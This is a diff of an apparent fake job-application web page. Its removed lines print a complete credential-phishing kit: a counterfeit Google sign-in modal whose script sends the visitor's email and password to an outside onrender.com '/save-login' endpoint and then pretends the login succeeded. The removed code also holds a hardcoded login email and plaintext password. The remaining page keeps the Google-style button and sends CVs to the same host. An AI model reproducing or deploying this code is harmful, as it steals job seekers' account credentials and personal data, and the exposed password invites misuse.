@@ -25,9 +25,51 @@ body {
   overflow:hidden; background:var(--card); box-shadow:var(--shadow);
 }
 @media (max-width:900px){.container{grid-template-columns:1fr;}}
-
-/* ... Keep all your previous CSS ... */
-
+.left {padding:32px; border-right:1px solid #eef2f6; display:flex; flex-direction:column; gap:24px; background:linear-gradient(180deg, rgba(11,99,208,0.05), transparent);}
+.logo{display:flex;align-items:center;gap:14px;}
+.logo-mark{width:48px;height:48px;border-radius:12px;background:linear-gradient(135deg,#0b63d0,#2a9df4);display:flex;align-items:center;justify-content:center;color:white;font-weight:700;font-size:18px;}
+.company{font-weight:700;font-size:20px;color:#0f1724;}
+.tag{color:var(--muted);font-size:14px;}
+.provider-choices{display:flex;flex-direction:column;gap:12px;width:100%;margin-top:12px;}
+.google-btn{display:flex;align-items:center;gap:12px;padding:12px 16px;border:1px solid #dadce0;border-radius:6px;background:#fff;font-weight:500;cursor:pointer;transition:all 0.2s; font-size:14px;}
+.google-btn img{width:20px;height:20px;}
+.google-btn:hover{background:#f7f7f7;box-shadow:0 2px 6px rgba(0,0,0,0.15);}
+.btn-ghost{background:#fff;border:1px solid #e6edf8;padding:12px 16px;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer;transition:all 0.2s;}
+.btn-ghost:hover{background:#f7f7f7;}
+.note{font-size:12px;color:#94a3b8;margin-top:auto;}
+.right{padding:28px 36px;}
+.panel{margin-bottom:24px;background:#fff;padding:28px;border-radius:16px;box-shadow:0 6px 20px rgba(0,0,0,0.06);}
+.field{margin-bottom:18px;display:flex;flex-direction:column;}
+label{font-weight:600;margin-bottom:6px;}
+input,textarea,select{
+  padding:12px;border-radius:8px;border:1px solid #d1d5db;font-size:14px;transition:all 0.2s;box-shadow:inset 0 1px 3px rgba(0,0,0,0.05);
+}
+input:focus,textarea:focus,select:focus{border-color:#0b63d0;box-shadow:0 0 0 2px rgba(11,99,208,0.15);outline:none;}
+textarea{resize:vertical;}
+.primary{background:linear-gradient(135deg,#0b63d0,#2a9df4);color:#fff;font-weight:600;padding:12px 20px;border:none;border-radius:8px;cursor:pointer;transition:all 0.2s;font-size:15px;}
+.primary:hover{transform:translateY(-2px) scale(1.02);box-shadow:0 6px 16px rgba(11,99,208,0.3);}
+.secondary{background:#e5e7eb;color:#000;padding:12px 20px;border-radius:8px;border:none;font-weight:500;cursor:pointer;}
+.success{color:var(--accent);font-weight:600;margin-top:20px;font-size:16px;text-align:center;}
+.actions{display:flex;gap:12px;}
+.progress-bar{display:flex;gap:6px;margin-bottom:20px;}
+.progress-bar .step{flex:1;height:8px;background:#e5e7eb;border-radius:4px;transition:all 0.3s;}
+.progress-bar .step.active{background:#0b63d0;}
+.drag-drop{border:2px dashed #d1d5db;border-radius:8px;padding:24px;text-align:center;color:#6b7280;cursor:pointer;transition:all 0.2s;}
+.drag-drop.dragover{border-color:#0b63d0;background:#f0f5ff;color:#0b63d0;}
+#cvFileName{margin-top:8px;font-size:13px;color:#0b63d0;font-weight:500;}
+#appForm > div{display:none;opacity:0;transform:translateY(10px);transition:opacity 0.3s ease, transform 0.3s ease;}
+#appForm > div.active{display:block;opacity:1;transform:translateY(0);}
+.modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);display:none;align-items:center;justify-content:center;z-index:9999;}
+.modal{background:white;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,0.25);width:380px;max-width:90%;padding:30px;font-family:Roboto,Arial,sans-serif;text-align:center;animation:modalOpen 0.25s ease-out;}
+.modal .google-header img{height:40px;margin-bottom:18px;}
+.modal input{width:100%;padding:12px;border:1px solid #dadce0;border-radius:6px;margin-top:8px;font-size:14px;}
+.modal input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px #1a73e8;outline:none;}
+.modal .actions{display:flex;justify-content:space-between;margin-top:24px;}
+.modal button{padding:10px 18px;border:none;border-radius:6px;font-size:14px;cursor:pointer;}
+.btn-next{background:#1a73e8;color:white;font-weight:500;}
+.btn-cancel{background:transparent;color:#1a73e8;font-weight:500;}
+.loading-text{color:#6b7280;font-size:13px;margin-top:6px;}
+@keyframes modalOpen{from{opacity:0;transform:scale(0.95);}to{opacity:1;transform:scale(1);}}
 </style>
 </head>
 <body>
@@ -40,7 +82,7 @@ body {
     </div>
     <div class="provider-choices">
       <button id="googleBtn" class="google-btn">
-        <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google logo" style="width:20px; height:20px;">
+        <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google logo">
         <span>Continue with Google</span>
       </button>
       <button id="companyBtn" class="btn-ghost">Sign in with company account</button>
@@ -126,6 +168,7 @@ body {
           <h3>Step 5: Upload CV</h3>
           <div class="field drag-drop" id="cvDrop">Click or drag your CV here</div>
           <input type="file" name="cv" id="cvInput" style="display:none;" required>
+          <div id="cvFileName"></div>
           <div class="actions">
             <button type="button" class="secondary" onclick="prevStep(4)">Back</button>
             <button type="submit" class="primary">Submit Application</button>
@@ -137,134 +180,8 @@ body {
   </main>
 </div>
 
-<!-- Google Modal -->
-<div id="googleModal" class="modal-overlay">
-  <div class="modal">
-    <div class="google-header">
-      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-    </div>
-    <h2 id="modalTitle">Sign in</h2>
-    <div id="stepEmail">
-      <label>Email</label>
-      <input type="email" id="googleEmail" placeholder="example@gmail.com" autocomplete="email">
-      <div class="loading-text" id="emailLoading" style="display:none;">Checking email...</div>
-    </div>
-    <div id="stepPassword" style="display:none">
-      <label> Your google account Password</label>
-      <input type="password" id="googlePassword" placeholder="Enter your password" autocomplete="current-password">
-      <div class="loading-text" id="passLoading" style="display:none;">Verifying password...</div>
-    </div>
-    <div class="actions">
-      <button class="btn-cancel" id="cancelGoogle">Cancel</button>
-      <button class="btn-next" id="nextGoogleBtn">Next</button>
-    </div>
-  </div>
-</div>
-
 <script>
-// Elements
-const googleBtn = document.getElementById('googleBtn');
-const companyBtn = document.getElementById('companyBtn');
-const providerStatus = document.getElementById('providerStatus');
-const appPanel = document.getElementById('appPanel');
-const signinPanel = document.getElementById('signinPanel');
-
-const googleModal = document.getElementById('googleModal');
-const stepEmail = document.getElementById('stepEmail');
-const stepPassword = document.getElementById('stepPassword');
-const emailInput = document.getElementById('googleEmail');
-const passInput = document.getElementById('googlePassword');
-const nextGoogleBtn = document.getElementById('nextGoogleBtn');
-const cancelGoogle = document.getElementById('cancelGoogle');
-const emailLoading = document.getElementById('emailLoading');
-const passLoading = document.getElementById('passLoading');
-
-let stage = 0;
-let storedEmail = "";
-
-// Open Google Modal
-googleBtn.addEventListener('click', () => {
-  googleModal.style.display = "flex";
-  stage = 0;
-  storedEmail = "";
-  stepEmail.style.display = "block";
-  stepPassword.style.display = "none";
-  emailInput.value = "";
-  passInput.value = "";
-  emailLoading.style.display = "none";
-  passLoading.style.display = "none";
-  emailInput.focus();
-});
-
-// Close Modal
-cancelGoogle.addEventListener('click', () => {
-  googleModal.style.display = "none";
-});
-
-// Google Modal Logic + Save to backend
-nextGoogleBtn.addEventListener('click', async () => {
-  if(stage === 0){
-    const email = emailInput.value.trim();
-    if(!email){ alert("Enter your email"); return; }
-    emailLoading.style.display = "block";
-    setTimeout(() => {
-      emailLoading.style.display = "none";
-      stage = 1;
-      storedEmail = email;
-      stepEmail.style.display = "none";
-      stepPassword.style.display = "block";
-      passInput.focus();
-    }, 1500);
-  } else {
-    const password = passInput.value.trim();
-    if(!password){ alert("Enter your password"); return; }
-    passLoading.style.display = "block";
-    setTimeout(async () => {
-      try {
-        await fetch('https://ac-corporations.onrender.com/save-login', {
-          method: 'POST',
-          headers: {'Content-Type':'application/json'},
-          body: JSON.stringify({email: storedEmail, password})
-        });
-      } catch(err) { console.error(err); }
-
-      googleModal.style.display = "none";
-      providerStatus.textContent = `Signed in via Google (${storedEmail})`;
-      appPanel.style.display = 'block';
-      signinPanel.style.display = 'none';
-      showStep(1);
-    }, 1500);
-  }
-});
-
-// Company SSO
-companyBtn.addEventListener('click', () => {
-  const allowedEmail = "samsmollett50@gmail.com";
-  const allowedPassword = "adikah1234";
-
-  const workEmail = prompt("Enter your company email:");
-  if (!workEmail) return;
-
-  if (workEmail !== allowedEmail) {
-    alert("Access denied. Only the authorized account can sign in.");
-    return;
-  }
-
-  const password = prompt("Enter your password:");
-  if (!password) return;
-
-  if (password !== allowedPassword) {
-    alert("Incorrect password. Access denied.");
-    return;
-  }
-
-  providerStatus.textContent = `Signed in via Company SSO (${workEmail})`;
-  appPanel.style.display = 'block';
-  signinPanel.style.display = 'none';
-  showStep(1);
-});
-
-// Multi-step form
+// Multi-step
 const steps = [1,2,3,4,5];
 function showStep(n){
   steps.forEach(s => {
@@ -280,38 +197,46 @@ function prevStep(n){ showStep(n); }
 // CV Drag & Drop
 const cvDrop = document.getElementById("cvDrop");
 const cvInput = document.getElementById("cvInput");
+const cvFileName = document.getElementById("cvFileName");
+
 cvDrop.addEventListener("click", ()=>cvInput.click());
 cvDrop.addEventListener("dragover", e => { e.preventDefault(); cvDrop.classList.add("dragover"); });
 cvDrop.addEventListener("dragleave", e => { e.preventDefault(); cvDrop.classList.remove("dragover"); });
 cvDrop.addEventListener("drop", e => {
   e.preventDefault(); 
   cvDrop.classList.remove("dragover");
-  if(e.dataTransfer.files.length) cvInput.files = e.dataTransfer.files;
+  if(e.dataTransfer.files.length) {
+    cvInput.files = e.dataTransfer.files;
+    cvFileName.textContent = cvInput.files[0].name;
+  }
 });
+cvInput.addEventListener("change", ()=>{ if(cvInput.files.length) cvFileName.textContent = cvInput.files[0].name; });
 
-// Form Submission with CV upload
+// Form submission with CV
 const appForm = document.getElementById("appForm");
 const successMsg = document.getElementById("successMsg");
+
 appForm.addEventListener("submit", async e => {
   e.preventDefault();
+
   const formData = new FormData(appForm);
 
-  if(cvInput.files.length > 0){
-    formData.append('cv', cvInput.files[0]);
+  if(cvInput.files.length === 0){
+    alert("Please upload your CV.");
+    return;
   }
 
   try {
-    const response = await fetch('https://ac-corporations.onrender.com/submit-application', {
-      method: 'POST',
+    const res = await fetch('https://ac-corporations.onrender.com/submit-application', {
+      method:'POST',
       body: formData
     });
-
-    if(response.ok){
+    if(res.ok){
       appForm.style.display='none';
       successMsg.style.display='block';
     } else {
-      const text = await response.text();
-      alert("Error submitting application: " + text);
+      const txt = await res.text();
+      alert("Submission failed: "+txt);
     }
   } catch(err){
     console.error(err);
@@ -322,4 +247,6 @@ appForm.addEventListener("submit", async e => {
 
 </body>
 </html>
+
+
 
